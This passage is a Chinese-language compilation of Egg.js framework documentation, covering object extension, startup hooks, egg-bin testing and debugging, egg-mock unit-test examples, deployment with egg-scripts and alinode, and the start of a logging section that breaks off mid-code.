框架会把 app/extend/request.js 中定义的对象与内置 request 的 prototype 对象进行合并，在处理请求时会基于扩展后的 prototype 生成 request 对象。

例如，增加一个 request.foo 属性 Getter：

// app/extend/request.js
module.exports = {
  get foo() {
    return this.get('x-request-foo');
  },
};
 Response
Response 对象和 Koa 的 Response 对象相同，是 请求级别 的对象，它提供了大量响应相关的属性和方法供使用。

 访问方式
ctx.response
ctx 上的很多属性和方法都被代理到 response 对象上，对于这些属性和方法使用 ctx 和使用 response 去访问它们是等价的，例如 ctx.status = 404 和 ctx.response.status = 404 是等价的。

Koa 内置的代理 response 的属性和方法列表：Koa Response aliases

 扩展方式
框架会把 app/extend/response.js 中定义的对象与内置 response 的 prototype 对象进行合并，在处理请求时会基于扩展后的 prototype 生成 response 对象。

例如，增加一个 response.foo 属性 setter：

// app/extend/response.js
module.exports = {
  set foo(value) {
    this.set('x-response-foo', value);
  },
};
就可以这样使用啦：this.response.foo = 'bar';

 Helper
Helper 函数用来提供一些实用的 utility 函数。

它的作用在于我们可以将一些常用的动作抽离在 helper.js 里面成为一个独立的函数，这样可以用 JavaScript 来写复杂的逻辑，避免逻辑分散各处。另外还有一个好处是 Helper 这样一个简单的函数，可以让我们更容易编写测试用例。

框架内置了一些常用的 Helper 函数。我们也可以编写自定义的 Helper 函数。

 访问方式
通过 ctx.helper 访问到 helper 对象，例如：

// 假设在 app/router.js 中定义了 home router
app.get('home', '/', 'home.index');

// 使用 helper 计算指定 url path
ctx.helper.pathFor('home', { by: 'recent', limit: 20 })
// => /?by=recent&limit=20
 扩展方式
框架会把 app/extend/helper.js 中定义的对象与内置 helper 的 prototype 对象进行合并，在处理请求时会基于扩展后的 prototype 生成 helper 对象。

例如，增加一个 helper.foo() 方法：

// app/extend/helper.js
module.exports = {
  foo(param) {
    // this 是 helper 对象，在其中可以调用其他 helper 方法
    // this.ctx => context 对象
    // this.app => application 对象
  },
};
 按照环境进行扩展
另外，还可以根据环境进行有选择的扩展，例如，只在 unittest 环境中提供 mockXX() 方法以便进行 mock 方便测试。

// app/extend/application.unittest.js
module.exports = {
  mockXX(k, v) {
  }
};
这个文件只会在 unittest 环境加载。

同理，对于 Application，Context，Request，Response，Helper 都可以使用这种方式针对某个环境进行扩展，更多参见运行环境。
--------------------------------------------------
启动时自定义
我们常常需要在应用启动期间进行一些初始化工作，等初始化完成后应用才可以启动成功，并开始对外提供服务。

框架提供了统一的入口文件（app.js）进行启动过程自定义，这个文件只返回一个函数。例如，我们需要在应用启动期间从远程接口加载一份全国城市列表，以便于后续在 Controller 中使用：

// app.js
module.exports = app => {
  app.beforeStart(async () => {
    // 应用会等待这个函数执行完成才启动
    app.cities = await app.curl('http://example.com/city.json', {
      method: 'GET',
      dataType: 'json',
    });

    // 也可以通过以下方式来调用 Service
    // const ctx = app.createAnonymousContext();
    // app.cities = await ctx.service.cities.load();
  });
};
在 Controller 中就可以使用了：

// app/controller/home.js
class HomeController extends Controller {
  async index() {
    // ctx.app.cities 在上面启动期间已经加载，可以直接使用
  }
}
注意：在 beforeStart 中不建议做太耗时的操作，框架会有启动的超时检测。
--------------------------------------------------
在这里我们需要使用到 egg-bin 模块（只在本地开发和单元测试使用，如果线上请参考 应用部署）。

首先，我们需要把 egg-bin 模块作为 devDependencies 引入：

$ npm i egg-bin --save-dev

添加命令
添加 npm scripts 到 package.json：

{
  "scripts": {
    "dev": "egg-bin dev"
  }
}
这样我们就可以通过 npm run dev 命令启动应用。

 环境配置
本地启动的应用是以 env: local 启动的，读取的配置也是 config.default.js 和 config.local.js 合并的结果。

 指定端口
本地启动应用默认监听 7001 端口，可指定其他端口，例如：

{
  "scripts": {
    "dev": "egg-bin dev --port 7001"
  }
}


##单元测试
这里主要讲解工具部分的使用，更多关于单元测试的内容请参考这里。

 添加命令
添加 npm scripts 到 package.json：

{
  "scripts": {
    "test": "egg-bin test"
  }
}
这样我们就可以通过 npm test 命令运行单元测试。

 环境配置
测试用例执行时，应用是以 env: unittest 启动的，读取的配置也是 config.default.js 和 config.unittest.js 合并的结果。

 运行特定用例文件
运行 npm test 时会自动执行 test 目录下的以 .test.js 结尾的文件（默认 glob 匹配规则 test/**/*.test.js ）。

我们在编写用例时往往想单独执行正在编写的用例，可以通过以下方式指定特定用例文件：

$ TESTS=test/x.test.js npm test
支持 glob 规则。

 指定 reporter
Mocha 支持多种形式的 reporter，默认使用 spec reporter。

可以手动设置 TEST_REPORTER 环境变量来指定 reporter，例如使用 dot：

$ TEST_REPORTER=dot npm test
image

 指定用例超时时间
默认执行超时时间为 30 秒。我们也可以手动指定超时时间（单位毫秒），例如设置为 5 秒：

$ TEST_TIMEOUT=5000 npm test
 通过 argv 方式传参
egg-bin test 除了环境变量方式，也支持直接传参，支持 mocha 的所有参数，参见：mocha usage 。

$ # npm 传递参数需额外加一个 `--`，参见 https://docs.npmjs.com/cli/run-script
$ npm test -- --help
$
$ # 等同于 `TESTS=test/**/test.js npm test`，受限于 bash，最好加上双引号
$ npm test "test/**/test.js"
$
$ # 等同于 `TEST_REPORTER=dot npm test`
$ npm test -- --reporter=dot
$
$ # 支持 mocha 的参数，如 grep / require 等
$ npm test -- -t 30000 --grep="should GET"


## 代码覆盖率
egg-bin 已经内置了 nyc 来支持单元测试自动生成代码覆盖率报告。

添加 npm scripts 到 package.json：

{
  "scripts": {
    "cov": "egg-bin cov"
  }
}
这样我们就可以通过 npm run cov 命令运行单元测试覆盖率。

$ egg-bin cov

  test/controller/home.test.js
    GET /
      ✓ should status 200 and get the body
    POST /post
      ✓ should status 200 and get the request body

  ...

  16 passing (1s)

=============================== Coverage summary ===============================
Statements   : 100% ( 41/41 )
Branches     : 87.5% ( 7/8 )
Functions    : 100% ( 10/10 )
Lines        : 100% ( 41/41 )
================================================================================
还可以通过 open coverage/lcov-report/index.html 打开完整的 HTML 覆盖率报告。

image

 环境配置
和 test 命令一样，cov 命令执行时，应用也是以 env: unittest 启动的，读取的配置也是 config.default.js 和 config.unittest.js 合并的结果。

 忽略指定文件
对于某些不需要跑测试覆盖率的文件，可以通过 COV_EXCLUDES 环境变量指定：

$ COV_EXCLUDES=app/plugins/c* npm run cov
$ # 或者传参方式
$ npm run cov -- --x=app/plugins/c*


--------------------------------------------------
调试
调试
 日志输出
 使用 logger 模块
框架内置了日志 功能，使用 logger.debug() 输出调试信息，推荐在应用代码中使用它。

// controller
this.logger.debug('current user: %j', this.user);

// service
this.ctx.logger.debug('debug info from service');

// app/init.js
app.logger.debug('app init');
通过 config.logger.level 来配置打印到文件的日志级别，通过 config.logger.consoleLevel 配置打印到终端的日志级别。

 使用 debug 模块
debug 模块是 Node.js 社区广泛使用的 debug 工具，很多模块都使用它模块打印调试信息，Egg 社区也广泛采用这一机制打印 debug 信息，推荐在框架和插件开发中使用它。

我们可以通过 DEBUG 环境变量选择开启指定的调试代码，方便观测执行过程。

（调试模块和日志模块不要混淆，而且日志模块也有很多功能，这里所说的日志都是调试信息。）

开启所有模块的日志：

$ DEBUG=* npm run dev
开启指定模块的日志：

$ DEBUG=egg* npm run dev
单元测试也可以用 DEBUG=* npm test 来查看测试用例运行的详细日志。

 使用 egg-bin 调试
 添加命令
添加 npm scripts 到 package.json：

{
  "scripts": {
    "debug": "egg-bin debug"
  }
}
这样我们就可以通过 npm run debug 命令来断点调试应用。

egg-bin 会智能选择调试协议，在 7.x 之后版本使用 Inspector Protocol 协议，低版本使用 Legacy Protocol。

同时也支持自定义调试参数：

$ egg-bin debug --proxy=9999 --inpsect=9229 --inspect-brk

master 调试端口为 9229 或 5858（旧协议）
agent 调试端口固定为 5800
worker 调试端口为 master 调试端口递增。
开发阶段 worker 在代码修改后会热重启，导致调试端口会自增，故 egg-bin 启动了代理服务，用户可以直接 attach 9999 端口即可，无需担心重启问题。
 环境配置
执行 debug 命令时，应用也是以 env: local 启动的，读取的配置是 config.default.js 和 config.local.js 合并的结果。

 使用 DevTools 进行调试
最新的 DevTools 只支持 Inspector Protocol 协议，故你需要使用 Node.js 7.x+ 的版本方能使用。

执行 npm run debug 启动：

➜  showcase git:(master) ✗ npm run debug

> showcase@1.0.0 debug /Users/tz/Workspaces/eggjs/test/showcase
> egg-bin debug

Debugger listening on ws://127.0.0.1:9229/f8258ca6-d5ac-467d-bbb1-03f59bcce85b
For help see https://nodejs.org/en/docs/inspector
2017-09-14 16:01:35,990 INFO 39940 [master] egg version 1.8.0
Debugger listening on ws://127.0.0.1:5800/bfe1bf6a-2be5-4568-ac7d-69935e0867fa
For help see https://nodejs.org/en/docs/inspector
2017-09-14 16:01:36,432 INFO 39940 [master] agent_worker#1:39941 started (434ms)
Debugger listening on ws://127.0.0.1:9230/2fcf4208-4571-4968-9da0-0863ab9f98ae
For help see https://nodejs.org/en/docs/inspector
9230 opened
Debug Proxy online, now you could attach to 9999 without worry about reload.
DevTools → chrome-devtools://devtools/bundled/inspector.html?experiments=true&v8only=true&ws=127.0.0.1:9999/__ws_proxy__
然后选择以下一种方式即可：

直接访问控制台最后输出的 DevTools 地址，该地址是代理后的 worker，无需担心重启问题。
访问 chrome://inspect，配置对应的端口，然后点击 Open dedicated DevTools for Node 即可打开调试控制台。
DevTools

 使用 WebStorm 进行调试
egg-bin 会自动读取 WebStorm 调试模式下设置的环境变量 $NODE_DEBUG_OPTION。

使用 WebStorm 的 npm 调试启动即可：

WebStorm

 使用 VSCode 进行调试
我们提供了一个 vscode-eggjs 扩展。

VSCode

如图，会自动生成配置文件 .vscode/launch.json 如下，然后 F5 一键启动即可。

// .vscode/launch.json
{
  "version": "0.2.0",
  "configurations": [
    {
      "name": "Launch Egg",
      "type": "node",
      "request": "launch",
      "cwd": "${workspaceRoot}",
      "runtimeExecutable": "npm",
      "windows": { "runtimeExecutable": "npm.cmd" },
      "runtimeArgs": [ "run", "debug", "--", "--inspect-brk" ],
      "console": "integratedTerminal",
      "protocol": "auto",
      "restart": true,
      "port": 9229,
      "autoAttachChildProcesses": true
    }
  ]
}
更多 VSCode Debug 用法可以参见文档: Node.js Debugging in VS Code


--------------------------------------------------
单元测试，Egg用的是Mocha 断言用的是assert

测试约定
为了让我们更多地关注测试用例本身如何编写，而不是耗费时间在如何运行测试脚本等辅助工作上， 框架对单元测试做了一些基本约定。

 测试目录结构
我们约定 test 目录为存放所有测试脚本的目录，测试所使用到的 fixtures 和相关辅助脚本都应该放在此目录下。

测试脚本文件统一按 ${filename}.test.js 命名，必须以 .test.js 作为文件后缀。

一个应用的测试目录示例：

test
├── controller
│   └── home.test.js
├── hello.test.js
└── service
    └── user.test.js

 测试运行工具
统一使用 egg-bin 来运行测试脚本， 自动将内置的 Mocha、co-mocha、power-assert，nyc 等模块组合引入到测试脚本中， 让我们聚焦精力在编写测试代码上，而不是纠结选择那些测试周边工具和模块。

只需要在 package.json 上配置好 scripts.test 即可。

{
  "scripts": {
    "test": "egg-bin test"
  }
}
然后就可以按标准的 npm test 来运行测试了。

npm test

> unittest-example@ test /Users/mk2/git/github.com/eggjs/examples/unittest
> egg-bin test

  test/hello.test.js
    ✓ should work

  1 passing (10ms)


##准备测试
本文主要介绍如何编写应用的单元测试，关于框架和插件的单元测试请查看框架开发和插件开发相关章节。

 mock
正常来说，如果要完整手写一个 app 创建和启动代码，还是需要写一段初始化脚本的， 并且还需要在测试跑完之后做一些清理工作，如删除临时文件，销毁 app。

常常还有模拟各种网络异常，服务访问异常等特殊情况。

所以我们单独为框架抽取了一个测试 mock 辅助模块：egg-mock， 有了它我们就可以非常快速地编写一个 app 的单元测试，并且还能快速创建一个 ctx 来测试它的属性、方法和 Service 等。

 app
在测试运行之前，我们首先要创建应用的一个 app 实例， 通过它来访问需要被测试的 Controller、Middleware、Service 等应用层代码。

通过 egg-mock，结合 Mocha 的 before 钩子就可以便捷地创建出一个 app 实例。

// test/controller/home.test.js
const assert = require('assert');
const mock = require('egg-mock');

describe('test/controller/home.test.js', () => {
  let app;
  before(() => {
    // 创建当前应用的 app 实例
    app = mock.app();
    // 等待 app 启动成功，才能执行测试用例
    return app.ready();
  });
});
这样我们就拿到了一个 app 的引用，接下来所有测试用例都会基于这个 app 进行。 更多关于创建 app 的信息请查看 mock.app(options) 文档。

每一个测试文件都需要这样创建一个 app 实例非常冗余，因此 egg-mock 提供了一个 bootstrap 文件，可以直接从它上面拿到我们所常用的实例：

// test/controller/home.test.js
const { app, mock, assert } = require('egg-mock/bootstrap');

describe('test/controller/home.test.js', () => {
  // test cases
});
 ctx
我们除了 app，还需要一种方式便捷地拿到 ctx，方便我们进行 Extend、Service、Helper 等测试。 而我们已经通过上面的方式拿到了一个 app，结合 egg-mock 提供的 app.mockContext(options) 方法来快速创建一个 ctx 实例。

it('should get a ctx', () => {
  const ctx = app.mockContext();
  assert(ctx.method === 'GET');
  assert(ctx.url === '/');
});
如果我们想模拟 ctx.user 这个数据，也可以通过给 mockContext 传递 data 参数实现：

it('should mock ctx.user', () => {
  const ctx = app.mockContext({
    user: {
      name: 'fengmk2',
    },
  });
  assert(ctx.user);
  assert(ctx.user.name === 'fengmk2');
});
现在我们拿到了 app，也知道如何创建一个 ctx 了，那么就可以进行更多代码的单元测试了。

 测试执行顺序
特别需要注意的是执行顺序，尽量保证在执行某个用例的时候执行相关代码。

常见的错误写法

// Bad
const { app } = require('egg-mock/bootstrap');

describe('bad test', () => {
  doSomethingBefore();

  it('should redirect', () => {
    return app.httpRequest()
      .get('/')
      .expect(302);
  });
});
Mocha 刚开始运行的时候会载入所有用例，这时 describe 方法就会被调用，那 doSomethingBefore 就会启动。 如果希望使用 only 的方式只执行某个用例那段代码还是会被执行，这是非预期的。

正确的做法是将其放到 before 中，只有运行这个套件中某个用例才会执行。

// Good
const { app } = require('egg-mock/bootstrap');

describe('good test', () => {
  before(() => doSomethingBefore());

  it('should redirect', () => {
    return app.httpRequest()
      .get('/')
      .expect(302);
  });
});
Mocha 使用 before/after/beforeEach/afterEach 来处理前置后置任务，基本能处理所有问题。 每个用例会按 before -> beforeEach -> it -> afterEach -> after 的顺序执行，而且可以定义多个。

describe('egg test', () => {
  before(() => console.log('order 1'));
  before(() => console.log('order 2'));
  after(() => console.log('order 6'));
  beforeEach(() => console.log('order 3'));
  afterEach(() => console.log('order 5'));
  it('should worker', () => console.log('order 4'));
});

 异步测试
egg-bin 支持测试异步调用，它支持多种写法：

// 使用返回 Promise 的方式
it('should redirect', () => {
  return app.httpRequest()
    .get('/')
    .expect(302);
});

// 使用 callback 的方式
it('should redirect', done => {
  app.httpRequest()
    .get('/')
    .expect(302, done);
});

// 使用 async
it('should redirect', async () => {
  await app.httpRequest()
    .get('/')
    .expect(302);
});
使用哪种写法取决于不同应用场景，如果遇到多个异步可以使用 async function，也可以拆分成多个测试用例。

## Controller 测试
Controller 在整个应用代码里面属于比较难测试的部分了，因为它跟 router 配置紧密相关， 我们需要利用 app.httpRequest() SuperTest 发起一个真实请求， 来将 Router 和 Controller 连接起来，并且可以帮助我们发送各种满足边界条件的请求数据， 以测试 Controller 的参数校验完整性。 app.httpRequest() 是 egg-mock 封装的 SuperTest 请求实例。

例如我们要给 app/controller/home.js：

// app/router.js
module.exports = app => {
  const { router, controller } = app;
  router.get('homepage', '/', controller.home.index);
};

// app/controller/home.js
class HomeController extends Controller {
  async index() {
    this.ctx.body = 'hello world';
  }
}
写一个完整的单元测试，它的测试代码 test/controller/home.test.js 如下：

const { app, mock, assert } = require('egg-mock/bootstrap');

describe('test/controller/home.test.js', () => {
  describe('GET /', () => {
    it('should status 200 and get the body', () => {
      // 对 app 发起 `GET /` 请求
      return app.httpRequest()
        .get('/')
        .expect(200) // 期望返回 status 200
        .expect('hello world'); // 期望 body 是 hello world
    });

    it('should send multi requests', async () => {
      // 使用 generator function 方式写测试用例，可以在一个用例中串行发起多次请求
      await app.httpRequest()
        .get('/')
        .expect(200) // 期望返回 status 200
        .expect('hello world'); // 期望 body 是 hello world

      // 再请求一次
      const result = await app.httpRequest()
        .get('/')
        .expect(200)
        .expect('hello world');

      // 也可以这样验证
      assert(result.status === 200);
    });
  });
});
通过基于 SuperTest 的 app.httpRequest() 可以轻松发起 GET、POST、PUT 等 HTTP 请求，并且它有非常丰富的请求数据构造接口， 例如以 POST 方式发送一个 JSON 请求：

// app/controller/home.js
class HomeController extends Controller {
  async post() {
    this.ctx.body = this.ctx.request.body;
  }
}

// test/controller/home.test.js
it('should status 200 and get the request body', () => {
  // 模拟 CSRF token，下文会详细说明
  app.mockCsrf();
  return app.httpRequest()
    .post('/post')
    .type('form')
    .send({
      foo: 'bar',
    })
    .expect(200)
    .expect({
      foo: 'bar',
    });
});
更详细的 HTTP 请求构造方式，请查看 SuperTest 文档。

 mock CSRF
框架的默认安全插件会自动开启 CSRF 防护， 如果完整走 CSRF 校验逻辑，那么测试代码需要先请求一次页面，通过解析 HTML 拿到 CSRF token， 然后再使用此 token 发起 POST 请求。

所以 egg-mock 对 app 增加了 app.mockCsrf() 方法来模拟取 CSRF token 的过程。 这样在使用 SuperTest 请求 app 就会自动通过 CSRF 校验。

app.mockCsrf();
return app.httpRequest()
  .post('/post')
  .type('form')
  .send({
    foo: 'bar',
  })
  .expect(200)
  .expect({
    foo: 'bar',
  });


## Service 测试
Service 相对于 Controller 来说，测试起来会更加简单， 我们只需要先创建一个 ctx，然后通过 ctx.service.${serviceName} 拿到 Service 实例， 然后调用 Service 方法即可。

例如

// app/service/user.js
class UserService extends Service {
  async get(name) {
    return await userDatabase.get(name);
  }
}
编写单元测试：

describe('get()', () => {
  it('should get exists user', async () => {
    // 创建 ctx
    const ctx = app.mockContext();
    // 通过 ctx 访问到 service.user
    const user = await ctx.service.user.get('fengmk2');
    assert(user);
    assert(user.name === 'fengmk2');
  });

  it('should get null when user not exists', async () => {
    const ctx = app.mockContext();
    const user = await ctx.service.user.get('fengmk1');
    assert(!user);
  });
});
当然，实际的 Service 代码不会像我们示例中那么简单，这里只是展示如何测试 Service 而已。



Extend 测试
应用可以对 Application、Request、Response、Context 和 Helper 进行扩展。 我们可以对扩展的方法或者属性针对性的编写单元测试。

 Application
egg-mock 创建 app 的时候，已经将 Application 的扩展自动加载到 app 实例了， 直接使用这个 app 实例访问扩展的属性和方法即可进行测试。

例如 app/extend/application.js，我们给 app 增加了一个基于 ylru 的缓存功能：

const LRU = Symbol('Application#lru');
const LRUCache = require('ylru');
module.exports = {
  get lru() {
    if (!this[LRU]) {
      this[LRU] = new LRUCache(1000);
    }
    return this[LRU];
  },
};
对应的单元测试：

describe('get lru', () => {
  it('should get a lru and it work', () => {
    // 设置缓存
    app.lru.set('foo', 'bar');
    // 读取缓存
    assert(app.lru.get('foo') === 'bar');
  });
});
可以看到，测试 Application 的扩展是最容易的。

 Context
Context 测试只比 Application 多了一个 app.mockContext() 步骤来模拟创建一个 Context 对象。

例如在 app/extend/context.js 中增加一个 isXHR 属性，判断是否通过 XMLHttpRequest 发起的请求：

module.exports = {
  get isXHR() {
    return this.get('X-Requested-With') === 'XMLHttpRequest';
  },
};
对应的单元测试：

describe('isXHR()', () => {
  it('should true', () => {
    const ctx = app.mockContext({
      headers: {
        'X-Requested-With': 'XMLHttpRequest',
      },
    });
    assert(ctx.isXHR === true);
  });

  it('should false', () => {
    const ctx = app.mockContext({
      headers: {
        'X-Requested-With': 'SuperAgent',
      },
    });
    assert(ctx.isXHR === false);
  });
});
 Request
通过 ctx.request 来访问 Request 扩展的属性和方法，直接即可进行测试。

例如在 app/extend/request.js 中增加一个 isChrome 属性，判断是否 Chrome 浏览器发起的请求：

const IS_CHROME = Symbol('Request#isChrome');
module.exports = {
  get isChrome() {
    if (!this[IS_CHROME]) {
      const ua = this.get('User-Agent').toLowerCase();
      this[IS_CHROME] = ua.includes('chrome/');
    }
    return this[IS_CHROME];
  },
};
对应的单元测试：

describe('isChrome()', () => {
  it('should true', () => {
    const ctx = app.mockContext({
      headers: {
        'User-Agent': 'Chrome/56.0.2924.51',
      },
    });
    assert(ctx.request.isChrome === true);
  });

  it('should false', () => {
    const ctx = app.mockContext({
      headers: {
        'User-Agent': 'FireFox/1',
      },
    });
    assert(ctx.request.isChrome === false);
  });
});
 Response
Response 测试与 Request 完全一致。 通过 ctx.response 来访问 Response 扩展的属性和方法，直接即可进行测试。

例如在 app/extend/response.js 中增加一个 isSuccess 属性，判断当前响应状态码是否 200：

module.exports = {
  get isSuccess() {
    return this.status === 200;
  },
};
对应的单元测试：

describe('isSuccess()', () => {
  it('should true', () => {
    const ctx = app.mockContext();
    ctx.status = 200;
    assert(ctx.response.isSuccess === true);
  });

  it('should false', () => {
    const ctx = app.mockContext();
    ctx.status = 404;
    assert(ctx.response.isSuccess === false);
  });
});
 Helper
Helper 测试方式与 Service 类似，也是通过 ctx 来访问到 Helper，然后调用 Helper 方法测试。

例如 app/extend/helper.js

module.exports = {
  money(val) {
    const lang = this.ctx.get('Accept-Language');
    if (lang.includes('zh-CN')) {
      return `￥ ${val}`;
    }
    return `$ ${val}`;
  },
};
对应的单元测试：

describe('money()', () => {
  it('should RMB', () => {
    const ctx = app.mockContext({
      // 模拟 ctx 的 headers
      headers: {
        'Accept-Language': 'zh-CN,zh;q=0.5',
      },
    });
    assert(ctx.helper.money(100) === '￥ 100');
  });

  it('should US Dolar', () => {
    const ctx = app.mockContext();
    assert(ctx.helper.money(100) === '$ 100');
  });
});
 Mock 方法
egg-mock 除了上面介绍过的 app.mockContext() 和 app.mockCsrf() 方法外，还提供了非常多的 mock 方法帮助我们便捷地写单元测试。

如我们不想在终端 console 输出任何日志，可以通过 mock.consoleLevel('NONE') 来模拟。

又如我想模拟一次请求的 Session 数据，可以通过 app.mockSession(data) 来模拟。

describe('GET /session', () => {
  it('should mock session work', () => {
    app.mockSession({
      foo: 'bar',
      uid: 123,
    });
    return app.httpRequest()
      .get('/session')
      .expect(200)
      .expect({
        session: {
          foo: 'bar',
          uid: 123,
        },
      });
  });
});
因为 mock 之后会一直生效，我们需要避免每个单元测试用例之间是不能相互 mock 污染的， 所以通常我们都会在 afterEach 钩子里面还原掉所有 mock。

describe('some test', () => {
  // before hook

  afterEach(mock.restore);

  // it tests
});
引入 egg-mock/bootstrap 时，会自动在 afterEach 钩子中还原所有的 mock，不需要在测试文件中再次编写。

下面会详细解释一下 egg-mock 的常见使用场景。

 Mock 属性和方法
因为 egg-mock 是扩展自 mm 模块， 它包含了 mm 的所有功能，这样我们就可以非常方便地 mock 任意对象的属性和方法了。

 Mock 一个对象的属性
mock app.config.baseDir 指向 /tmp/mockapp

mock(app.config, 'baseDir', '/tmp/mockapp');
assert(app.config.baseDir === '/tmp/mockapp');
 Mock 一个对象的方法
mock fs.readFileSync 返回 hello world

mock(fs, 'readFileSync', filename => {
  return 'hello world';
});
assert(fs.readFileSync('foo.txt') === 'hello world');
还有 mock.data()，mock.error() 等更多高级的 mock 方法， 详细使用说明请查看 mm API。

 Mock Service
Service 作为框架标准的内置对象，我们提供了便捷的 app.mockService(service, methodName, fn) 模拟 Service 方法返回值。

例如，模拟 app/service/user 中的 get(name) 方法，让它返回一个本来不存在的用户数据。

it('should mock fengmk1 exists', () => {
  app.mockService('user', 'get', () => {
    return {
      name: 'fengmk1',
    };
  });

  return app.httpRequest()
    .get('/user?name=fengmk1')
    .expect(200)
    // 返回了原本不存在的用户信息
    .expect({
      name: 'fengmk1',
    });
});
通过 app.mockServiceError(service, methodName, error) 可以模拟 Service 调用异常。

例如，模拟 app/service/user 中的 get(name) 方法调用异常：

it('should mock service error', () => {
  app.mockServiceError('user', 'get', 'mock user service error');
  return app.httpRequest()
    .get('/user?name=fengmk2')
    // service 异常，触发 500 响应
    .expect(500)
    .expect(/mock user service error/);
});
 Mock HttpClient
框架内置了 HttpClient，应用发起的对外 HTTP 请求基本都是通过它来处理。 我们可以通过 app.mockHttpclient(url, method, data) 来 mock 掉 app.curl 和 ctx.curl 方法， 从而实现各种网络异常情况。

例如在 app/controller/home.js 中发起了一个 curl 请求

class HomeController extends Controller {
  async httpclient () {
    const res = await this.ctx.curl('https://eggjs.org');
    this.ctx.body = res.data.toString();
  }
}
需要 mock 它的返回值：

describe('GET /httpclient', () => {
  it('should mock httpclient response', () => {
    app.mockHttpclient('https://eggjs.org', {
      // 模拟的参数，可以是 buffer / string / json，
      // 都会转换成 buffer
      // 按照请求时的 options.dataType 来做对应的转换
      data: 'mock eggjs.org response',
    });
    return app.httpRequest()
      .get('/httpclient')
      .expect('mock eggjs.org response');
  });
});
--------------------------------------------------
应用部署

在本地开发时，我们使用 egg-bin dev 来启动服务，但是在部署应用的时候不可以这样使用。因为 egg-bin dev 会针对本地开发做很多处理，而生产运行需要一个更加简单稳定的方式。所以本章主要讲解如何部署你的应用。

一般从源码代码到真正运行，我们会拆分成构建和部署两步，可以做到一次构建多次部署。


## 构建
JavaScript 语言本身不需要编译的，构建过程主要是下载依赖。但如果使用 TypeScript 或者 Babel 支持 ES6 以上的特性，那就必须要这一步了。

一般安装依赖会指定 NODE_ENV=production 或 npm install --production 只安装 dependencies 的依赖。因为 devDependencies 中的模块过大而且在生产环境不会使用，安装后也可能遇到未知问题。

$ cd baseDir
$ npm install --production
$ tar -zcvf ../release.tgz .
  构建完成后打包成 tgz 文件，部署的时候解压启动就可以了。

增加构建环节才能做到真正的一次构建多次部署，理论上代码没有改动的时候是不需要再次构建的，可以用原来的包进行部署，这有着不少好处：

构建依赖的环境和运行时是有差异的，所以不要污染运行时环境。
可以减少发布的时间，而且易回滚，只需要把原来的包重新启动即可。


## 部署
服务器需要预装 Node.js，框架支持的 Node 版本为 >= 8.0.0。

框架内置了 egg-cluster 来启动 Master 进程，Master 有足够的稳定性，不再需要使用 pm2 等进程守护模块。

同时，框架也提供了 egg-scripts 来支持线上环境的运行和停止。

首先，我们需要把 egg-scripts 模块作为 dependencies 引入：

$ npm i egg-scripts --save
添加 npm scripts 到 package.json：

{
	"scripts": {
		"start": "egg-scripts start --daemon",
		"stop": "egg-scripts stop"
	}
}
这样我们就可以通过 npm start 和 npm stop 命令启动或停止应用。

注意：egg-scripts 不支持 Windows 系统。

 启动命令
$ egg-scripts start --port=7001 --daemon --title=egg-server-showcase
如上示例，支持以下参数：

--port=7001 端口号，默认会读取环境变量 process.env.PORT，如未传递将使用框架内置端口 7001。
--daemon 是否允许在后台模式，无需 nohup。若使用 Docker 建议直接前台运行。
--env=prod 框架运行环境，默认会读取环境变量 process.env.EGG_SERVER_ENV， 如未传递将使用框架内置环境 prod。
--workers=2 框架 worker 线程数，默认会创建和 CPU 核数相当的 app worker 数，可以充分的利用 CPU 资源。
--title=egg-server-showcase 用于方便 ps 进程时 grep 用，默认为 egg-server-${appname}。
--framework=yadan 如果应用使用了自定义框架，可以配置 package.json 的 egg.framework 或指定该参数。
--ignore-stderr 忽略启动期的报错。
所有 egg-cluster 的 Options 都支持透传，如 --https 等。
更多参数可查看 egg-scripts 和 egg-cluster 文档。

 启动配置项
你也可以在 config.{env}.js 中配置指定启动配置。

config/config.default.js

exports.cluster = {
	listen: {
		port: 7001,
		hostname: '127.0.0.1',
		// path: '/var/run/egg.sock',
	}
}
path，port，hostname 均为 server.listen 的参数，egg-scripts 和 egg.startCluster 方法传入的 port 优先级高于此配置。

停止命令
$ egg-scripts stop [--title=egg-server]
该命令将杀死 master 进程，并通知 worker 和 agent 优雅退出。

支持以下参数：

--title=egg-server 用于杀死指定的 egg 应用，未传递则会终止所有的 Egg 应用。
你也可以直接通过 ps -eo "pid,command" | grep "--type=egg-server" 来找到 master 进程，并 kill 掉，无需 kill -9。

监控
我们还需要对服务进行性能监控，内存泄露分析，故障排除等。

业界常用的有：

Node.js 性能平台（alinode）
NSolid
Node.js 性能平台（alinode）
Node.js 性能平台 是面向所有 Node.js 应用提供 性能监控、安全提醒、故障排查、性能优化 等服务的整体性解决方案，提供完善的工具链和服务，协助开发者快速发现和定位线上问题。

安装 Runtime
AliNode Runtime 可以直接替换掉 Node.js Runtime，对应版本参见文档。

全局安装方式参见文档。

有时候，同机会部署多个项目，期望多版本共存时，则可以把 Runtime 安装到当前项目：

$ npm i nodeinstall -g
$ nodeinstall --install-alinode ^3
nodeinstall 会把对应版本的 alinode 安装到项目的 node_modules 目录下。

注意：打包机的操作系统和线上系统需保持一致，否则对应的 Runtime 不一定能正常运行。

安装及配置
我们提供了 egg-alinode 来快速接入，无需安装 agenthub 等额外的常驻服务。

安装依赖：

$ npm i egg-alinode --save
开启插件：

// config/plugin.js
exports.alinode = {
	enable: true,
	package: 'egg-alinode',
};
配置：

// config/config.default.js
exports.alinode = {
	// 从 `Node.js 性能平台` 获取对应的接入参数
	appid: '<YOUR_APPID>',
	secret: '<YOUR_SECRET>',
};
启动应用
npm scripts 配置的 start 指令无需改变，通过 egg-scripts 即可。

启动命令需使用 npm start，因为 npm scripts 执行时会把 node_module/.bin 目录加入 PATH，故会优先使用当前项目执行的 Node 版本。

启动后会看到 master 日志包含以下内容：

$ [master] node version v8.9.4
$ [master] alinode version v3.8.4
访问控制台
控制台地址：https://node.console.aliyun.com

--------------------------------------------------
日志
日志对于 Web 开发的重要性毋庸置疑，它对于监控应用的运行状态、问题排查等都有非常重要的意义。

框架内置了强大的企业级日志支持，由 egg-logger 模块提供。

主要特性：

日志分级
统一错误日志，所有 logger 中使用 .error() 打印的 ERROR 级别日志都会打印到统一的错误日志文件中，便于追踪
启动日志和运行日志分离
自定义日志
多进程日志
自动切割日志
高性能
日志路径
所有日志文件默认都放在 ${appInfo.root}/logs/${appInfo.name} 路径下，例如 /home/admin/logs/example-app。
在本地开发环境 (env: local) 和单元测试环境 (env: unittest)，为了避免冲突以及集中管理，日志会打印在项目目录下的 logs 目录，例如 /path/to/example-app/logs/example-app。
如果想自定义日志路径：

// config/config.${env}.js
exports.logger = {
